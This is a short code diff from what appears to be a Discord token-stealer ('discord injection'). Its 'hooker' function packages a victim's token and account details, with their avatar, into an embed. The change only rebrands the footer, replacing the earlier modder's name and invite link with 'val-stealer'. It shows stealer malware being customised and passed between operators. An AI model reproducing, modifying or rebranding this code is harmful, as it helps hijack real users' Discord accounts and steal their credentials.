@@ -172,7 +172,7 @@ const hooker = async (content, token, account) => {
     url: `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`,
   };
   content["embeds"][0]["footer"] = {
-    text: "discord injection .gg/VqVRkzdGHg - modded by alphavodka ",
+    text: "discord injection  - modded by val-stealer ",
     icon_url:
       "https://github.com/reefdzefrfd/nonam/releases/download/frd/discord.original.jpg",
   };
